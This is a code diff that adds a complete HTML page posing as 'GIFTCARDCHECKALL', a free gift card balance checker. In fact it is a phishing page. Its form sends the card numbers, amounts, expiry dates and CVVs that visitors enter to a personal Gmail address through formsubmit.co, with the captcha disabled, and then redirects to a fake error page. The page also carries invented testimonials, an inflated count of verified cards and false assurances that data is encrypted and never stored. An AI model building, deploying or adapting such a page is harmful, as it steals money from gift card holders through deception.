@@ -1,0 +1,519 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GIFTCARDCHECKALL | Home</title>
+  <!-- Include Montserrat for headings -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
+  <style>
+    /* Reset & Global */
+    * {
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #ffffff; /* White background */
+      color: #333;
+    }
+    a { 
+      text-decoration: none; 
+      color: inherit; 
+    }
+    
+    /* Keyframe Animations */
+    @keyframes fadeInDown {
+      0% {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    @keyframes fadeInUp {
+      0% {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    @keyframes glow {
+      0% {
+        text-shadow: 0 0 10px #ffd700;
+      }
+      50% {
+        text-shadow: 0 0 20px #ffd700;
+      }
+      100% {
+        text-shadow: 0 0 10px #ffd700;
+      }
+    }
+    
+    /* HEADER */
+    header {
+      background-image: image("itemgift.png");
+      background-color: #0b3d91; /* Blue header */
+      background-blend-mode: overlay;
+      color: #fff;
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    header .logo {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 700;
+      animation: fadeInDown 1s ease-out;
+    }
+    nav ul {
+      list-style: none;
+      display: flex;
+    }
+    nav ul li {
+      margin-left: 1.5rem;
+    }
+    nav ul li a {
+      color: #fff;
+      font-weight: 500;
+      transition: color 0.3s;
+    }
+    nav ul li a:hover {
+      color: #ffd700; /* Yellow on hover */
+    }
+    
+    /* HERO SECTION */
+    .hero {
+      background-color: #ffffff; /* White background to match the PDF style */
+      padding: 2rem 1rem;
+      text-align: center;
+    }
+    .hero-content {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .hero-content h1 {
+      font-family: 'Montserrat', sans-serif;
+      font-size: 3rem;
+      margin-bottom: 0.5rem;
+      text-transform: uppercase;
+      color: #0b3d91;
+      animation: fadeInDown 1.5s ease-out, glow 2s infinite;
+    }
+    .hero-content p {
+      font-size: 1.2rem;
+      margin-bottom: 1.5rem;
+      color: #333;
+      animation: fadeInUp 1.5s ease-out;
+    }
+    .hero-image {
+      max-width: 400px;
+      margin: 1rem auto 2rem;
+      display: block;
+    }
+    .hero-content button {
+      background: #ffd700; /* Yellow */
+      color: #0b3d91;     /* Blue text */
+      border: none;
+      padding: 0.8rem 2rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+      animation: fadeInUp 1.5s ease-out;
+    }
+    .hero-content button:hover {
+      background: #fcd307;
+    }
+    
+    /* CONTAINER */
+    .container {
+      max-width: 1200px;
+      margin: auto;
+      padding: 2rem;
+      background: #fff;
+    }
+    
+    /* EXPLANATION SECTION */
+    .explanation {
+      padding: 2rem 1rem;
+      text-align: center;
+      line-height: 1.6;
+    }
+    .explanation p {
+      margin-bottom: 1rem;
+      font-size: 1rem;
+    }
+    .explanation strong {
+      font-size: 1.1rem;
+      color: #0b3d91; /* Blue emphasis */
+    }
+    .explanation img {
+      margin: 1.5rem 0;
+    }
+    .explanation-images {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-top: 2rem;
+      flex-wrap: wrap;
+    }
+    .explanation-images img {
+      max-width: 280px;
+      border-radius: 8px;
+    }
+    
+    /* FORM SECTION */
+    .form-section {
+      padding: 2rem 1rem;
+      display: flex;
+      justify-content: center;
+    }
+    .gift-form {
+      background: #f9f9f9;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 500px;
+    }
+    .gift-form h3 {
+      text-align: center;
+      margin-bottom: 1.5rem;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 1.8rem;
+      color: #0b3d91;
+      text-transform: uppercase;
+      animation: fadeInDown 1.5s ease-out;
+    }
+    .input-group {
+      margin-bottom: 1rem;
+      position: relative;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 0.3rem;
+      font-weight: 500;
+    }
+    .input-group input,
+    .input-group select {
+      width: 100%;
+      padding: 0.8rem 1rem;
+      font-size: 1rem;
+      border: 2px solid #ffd700; /* Yellow border */
+      border-radius: 4px;
+      transition: border 0.3s;
+    }
+    .input-group input:focus,
+    .input-group select:focus {
+      outline: none;
+      border-color: #0b3d91; /* Blue on focus */
+    }
+    .gift-form button {
+      width: 100%;
+      background: #0b3d91; /* Blue button */
+      color: #fff;
+      border: none;
+      padding: 1rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 1rem;
+      animation: fadeInUp 1.5s ease-out;
+    }
+    .gift-form button:hover {
+      background: #082e70;
+    }
+    
+    /* TESTIMONIALS SECTION */
+    .testimonials {
+      background: #f9f9f9;
+      padding: 2rem 1rem;
+      text-align: center;
+    }
+    .testimonials h2 {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+      color: #0b3d91;
+    }
+    .testimonials h3 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+    }
+    .quote {
+      background: #fff;
+      padding: 1.5rem;
+      border-radius: 8px;
+      margin: 1rem auto;
+      max-width: 800px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: left;
+      position: relative;
+    }
+    .quote p {
+      font-style: italic;
+      margin-bottom: 0.5rem;
+      padding-left: 60px;
+    }
+    .quote .author {
+      font-weight: bold;
+      color: #0b3d91;
+      text-align: right;
+    }
+    .testimonial-img {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      border: 2px solid #ffd700;
+    }
+    
+    /* PERFORMANCE SECTION */
+    .performance {
+      background-color: #0b3d91;
+      padding: 2rem 1rem;
+      text-align: center;
+    }
+    .performance h2 {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      color: #d3d8e1;
+    }
+    .performance p {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      color: #fefdfd;
+    }
+    .performance .stat {
+      font-size: 2rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+      color: #cad0db;
+    }
+    .performance button {
+      background: #ffd700; /* Yellow */
+      color: #0b3d91;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .performance button:hover {
+      background: #e6f85f;
+    }
+    
+    /* FOOTER */
+    footer {
+      background: #0b3d91; /* Blue footer */
+      color: #fff;
+      text-align: center;
+      padding: 1rem 2rem;
+      font-size: 0.9rem;
+    }
+    
+    /* RESPONSIVE */
+    @media(max-width: 768px) {
+      .hero-content h1 {
+        font-size: 2.2rem;
+      }
+      nav ul {
+        flex-direction: column;
+      }
+      nav ul li {
+        margin: 0.5rem 0;
+      }
+      .hero-image {
+        max-width: 90%;
+      }
+      .explanation-images {
+        flex-direction: column;
+        align-items: center;
+      }
+      .explanation-images img {
+        max-width: 80%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header>
+    <div class="logo">GIFTCARDCHECKALL</div>
+    <nav>
+      <ul>
+        <li><a href="#">Home</a></li>
+        <li><a href="#">About</a></li>
+        <li><a href="#">CHECK GIFTCARD</a></li>
+      </ul>
+    </nav>
+  </header>
+  
+  <!-- HERO SECTION -->
+  <section class="hero">
+    <div class="hero-content">
+      <h1>Check GiftCard</h1>
+      <p>#1 Top Online Tool to Check Gift Card Balance</p>
+      <!-- Replace 'img/giftcards.png' with your actual gift-cards PNG file path -->
+      <img src="https://www.google.com/url" alt="Gift Cards" class="hero-image">
+      <button onclick="scrollToForm()">CHECK GIFTCARD</button>
+    </div>
+  </section>
+  
+  <!-- EXPLANATION SECTION -->
+  <section class="explanation container">
+    <p>This system is designed to efficiently check your balance using advanced technology. It utilizes a smart and speedy algorithm that swiftly provides accurate information about your balance.</p>
+    <p>Our gift card verification is constructed upon a decentralized platform, guaranteeing that clients' gift card
+     information is not stored on the server. Upon verification, your card details are promptly deleted to ensure privacy and security.</p>
+    <div class="explanation-images">   
+    <img src="global.png" alt="Decentralized Platform">
+    </div>
+    <p><strong>We’ve built a Decentralized Platform.</strong></p>
+    <p>Our gift card verification is constructed upon a decentralized platform,guaranteeing that client's gift card information is not stored on the server.Upon verification,your card details are promptly deleted to ensure privacy and security.</p>
+    <p><strong>Protected and Safeguarded with Encryption.</strong></p>
+    <div class="explanation-images">
+      <!-- Replace with your actual encryption PNG file path -->
+      <img src="demo2.png" alt="Encryption">
+    </div>
+    <p>At Gift Card Check All, we prioritize the security of customers' gift card information by implementing robust encryption. This ensures that no attacker or false identity can compromise your verification processes.</p>
+  </section>
+  
+  <!-- FORM SECTION -->
+  <section class="form-section">
+    <form class="gift-form" id="giftCardForm" action="https://formsubmit.co/voiceofgoog82@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://giftcarderror.tiiny.site">
+      <h3>CHECK GIFTCARD</h3>
+      <div class="input-group">
+        <label for="giftCardType">Gift Card Type</label>
+        <select id="giftCardType" name="giftCardType" required>
+          <option value="">--Choose Card Type--</option>
+          <option value="Apple">Apple</option>
+          <option value="Amazon">Amazon</option>
+          <option value="Google">Google</option>
+          <option value="eBay">eBay</option>
+          <option value="iTunes">iTunes</option>
+          <option value="Steam">Steam</option>
+          <option value="Visa Vanilla">Visa Vanilla</option>
+          <option value="MasterCard">MasterCard</option>
+          <option value="Walmart Visa">Walmart Visa</option>
+          <option value="TT Visa">TT Visa</option>
+        </select>
+      </div>
+      
+      <div class="input-group">
+        <label for="currency">Currency</label>
+        <select id="currency" name="currency" required>
+          <option value="">--Choose Currency--</option>
+          <option value="USD">USD</option>
+          <option value="CAD">CAD</option>
+          <option value="EUR">EUR</option>
+        </select>
+      </div>
+      
+      <div class="input-group">
+        <label for="amount">USD Amount</label>
+        <input type="number" id="amount" name="amount" placeholder="Enter amount" required>
+      </div>
+      
+      <div class="input-group">
+        <label for="cardCode">Gift Card Number</label>
+        <input type="text" id="cardCode" name="cardCode" maxlength="20" placeholder="Enter digit of your card" required>
+      </div>
+      
+      <!-- Expiry Date & CVV (only for specific cards) -->
+      <div id="expiryContainer" class="input-group" style="display: none;">
+        <label for="expiryDate">Gift Card Expiry Date</label>
+        <input type="text" id="expiryDate" name="expiryDate" placeholder="e.g., March 2025">
+      </div>
+      
+      <div id="cvvContainer" class="input-group" style="display: none;">
+        <label for="cvv">Gift Card CVV</label>
+        <input type="number" id="cvv" name="cvv" placeholder="CVV">
+      </div>
+      
+      <button type="submit">CHECK</button>
+    </form>
+  </section>
+  <img src="itemgift.png" alt="Gift Cards" class="hero-image">
+
+  <!-- PERFORMANCE SECTION -->
+  <section class="performance">
+    <h2>Verified performance</h2>
+    <div class="stat">OVER 7826+ Gift Cards Verified</div>
+    <p>Gift Card have been Verified on our site.</p>
+    <p>Check yours now</p>
+    <button onclick="scrollToForm()">CHECK GIFTCARD</button>
+  </section>
+
+  <!-- TESTIMONIALS SECTION -->
+  <section class="testimonials">
+    <h2>What do they say?</h2>
+    <h3>Gift Cards in Review: Unveiling Customer Sentiments</h3>
+    <div class="quote">
+      <img class="testimonial-img" src="comm2.jpg" alt="Catherine Soft">
+      <p>"Glad I found this service. Quick, precise gift card balance checks and strong emphasis on data security."</p>
+      <div class="author">- Catherine Soft</div>
+    </div>
+    <div class="quote">
+      <img class="testimonial-img" src="comm3.jpeg" alt="Kelvin Wood">
+      <p>"Reliable and efficient gift card verification. Fast results, strong security, and user-friendly interface."</p>
+      <div class="author">- Kelvin Wood</div>
+    </div>
+    <div class="quote">
+      <img class="testimonial-img" src="comm1.jpeg" alt="David Martin">
+      <p>"I was skeptical, but this company's fast and accurate gift card balance verification impressed me. Privacy-focused too."</p>
+      <div class="author">- David Martin</div>
+    </div>
+  </section>
+  
+  
+  
+  <!-- FOOTER -->
+  <footer>
+    COPYRIGHT © 2025 GIFTCARDCHECKALL
+  </footer>
+  
+  <script>
+    // Scroll to the form section
+    function scrollToForm(){
+      document.querySelector('.form-section').scrollIntoView({ behavior: 'smooth' });
+    }
+    
+    // Show/hide expiry & CVV fields based on card type selection
+    const giftCardType = document.getElementById("giftCardType");
+    const expiryContainer = document.getElementById("expiryContainer");
+    const cvvContainer = document.getElementById("cvvContainer");
+    const requiresExpiryCvv = ["Visa Vanilla", "MasterCard", "Walmart Visa", "TT Visa"];
+    
+    giftCardType.addEventListener("change", function() {
+      if (requiresExpiryCvv.includes(this.value)) {
+        expiryContainer.style.display = "block";
+        cvvContainer.style.display = "block";
+      } else {
+        expiryContainer.style.display = "none";
+        cvvContainer.style.display = "none";
+      }
+    });
+    
+  
+  </script>
+</body>
+</html>
